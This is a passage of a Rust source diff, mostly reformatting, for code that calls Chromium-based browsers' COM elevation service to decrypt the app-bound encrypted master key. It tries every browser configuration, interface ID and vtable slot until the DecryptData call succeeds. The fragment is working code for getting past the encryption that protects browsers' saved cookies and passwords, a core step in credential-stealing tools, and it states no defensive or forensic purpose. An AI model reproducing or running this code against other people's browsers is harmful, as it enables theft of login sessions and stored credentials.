 type FnRef = unsafe extern "system" fn(*mut c_void) -> u32;
 type FnRun =
@@ -348,46 +461,32 @@ struct IElev {
     vtbl: *const Vtbl,
 }
 
-// ── BSTR helpers ──────────────────────────────────────────────────────────────
-
 struct OwnedBstr(*mut u16);
 
 impl OwnedBstr {
     unsafe fn from_bytes(data: &[u8]) -> Option<Self> {
-        if data.is_empty() {
-            return None;
-        }
+        if data.is_empty() { return None; }
         let p = SysAllocStringByteLen(data.as_ptr() as *const i8, data.len() as u32);
-        if p.is_null() {
-            None
-        } else {
-            Some(OwnedBstr(p))
-        }
+        if p.is_null() { None } else { Some(OwnedBstr(p)) }
     }
-    fn ptr(&self) -> *mut u16 {
-        self.0
-    }
+    fn ptr(&self) -> *mut u16 { self.0 }
 }
 impl Drop for OwnedBstr {
     fn drop(&mut self) {
         if !self.0.is_null() {
-            unsafe { SysFreeString(self.0) };
+            unsafe { SysFreeString(self.0); }
             self.0 = std::ptr::null_mut();
         }
     }
 }
 
 unsafe fn consume_bstr(p: *mut u16) -> Vec<u8> {
-    if p.is_null() {
-        return Vec::new();
-    }
+    if p.is_null() { return Vec::new(); }
     let len = SysStringByteLen(p) as usize;
     let bytes = std::slice::from_raw_parts(p as *const u8, len).to_vec();
     SysFreeString(p);
     bytes
 }
-
-// ── Core decryption ───────────────────────────────────────────────────────────
 
 const COINIT_APARTMENTTHREADED: u32 = 0x2;
 const CLSCTX_LOCAL_SERVER: u32 = 0x4;
@@ -396,21 +495,19 @@ const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
 const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
 const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
 const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;
-/// Try all browsers and IIDs until one succeeds.
+
 pub fn decrypt_app_bound_key(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
     unsafe {
         let hr = CoInitializeEx(std::ptr::null(), COINIT_APARTMENTTHREADED);
-        if hr < 0 && hr != 0x0000_0001u32 as i32 /* S_FALSE */ {
+        if hr < 0 && hr != 0x0000_0001u32 as i32 {
             return Err(format!("CoInitializeEx: 0x{hr:08X}"));
         }
-
         let result = try_all_browsers(encrypted_key);
         CoUninitialize();
         result
     }
 }
 
-/// Try each browser COM config for the detected browser.
 pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
     unsafe {
         let hr = CoInitializeEx(std::ptr::null(), COINIT_APARTMENTTHREADED);
@@ -425,13 +522,13 @@ pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result
 
 unsafe fn try_all_browsers(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
     let mut last = String::from("no browser tried");
-    for b in BROWSERS {
+    for b in all_browsers() {
         match try_browser(b, encrypted_key) {
             Ok(key) => return Ok(key),
             Err(e) => last = format!("{}: {e}", b.name),
         }
     }
-    match try_browser(&GENERIC_CHROMIUM, encrypted_key) {
+    match try_browser(&generic_chromium(), encrypted_key) {
         Ok(key) => return Ok(key),
         Err(e) => last = format!("Chromium: {e}"),
     }
@@ -443,23 +540,19 @@ unsafe fn try_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<
     let mut saw_no_interface = false;
     let mut saw_class_not_reg = false;
 
-    for iid in browser.iids {
-        let iid_str = guid_to_string(iid);
+    for &iid in browser.iids {
+        let iid_str = guid_to_string(&iid);
         debug_log(&format!("try CoCreateInstance {} IID {iid_str}", browser.name));
 
-        match try_one(encrypted_key, &browser.clsid, iid) {
+        match try_one(encrypted_key, &browser.clsid, &iid) {
             Ok(key) => {
                 debug_log(&format!("DecryptData OK via IID {iid_str}"));
                 return Ok(key);
             }
             Err(e) => {
                 debug_log(&format!("  failed: {e}"));
-                if e.contains("0x80004002") {
-                    saw_no_interface = true;
-                }
-                if e.contains("0x80040154") || e.contains("0x80040111") {
-                    saw_class_not_reg = true;
-                }
+                if e.contains("0x80004002") { saw_no_interface = true; }
+                if e.contains("0x80040154") || e.contains("0x80040111") { saw_class_not_reg = true; }
                 last = e;
             }
         }
@@ -514,9 +607,7 @@ unsafe fn call_decrypt_at_slot(
 }
 
 fn normalize_com_key(bytes: &[u8]) -> Option<Vec<u8>> {
-    if bytes.len() == 32 {
-        return Some(bytes.to_vec());
-    }
+    if bytes.len() == 32 { return Some(bytes.to_vec()); }
     if bytes.len() > 32 {
         let tail = &bytes[bytes.len() - 32..];
         if tail.iter().any(|&b| b != 0) {
@@ -553,7 +644,6 @@ unsafe fn try_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, Strin
     let elev = punk as *mut IElev;
     let release = || ((*(*elev).vtbl).rel)(punk);
 
-    // Chrome/Brave: slot 5. Edge and some forks: slot 8 (extra IElevatorEdgeBase methods).
     let mut last = String::from("no slot worked");
     for slot in [5usize, 8, 6, 7] {
         match call_decrypt_at_slot(punk, enc, slot) {
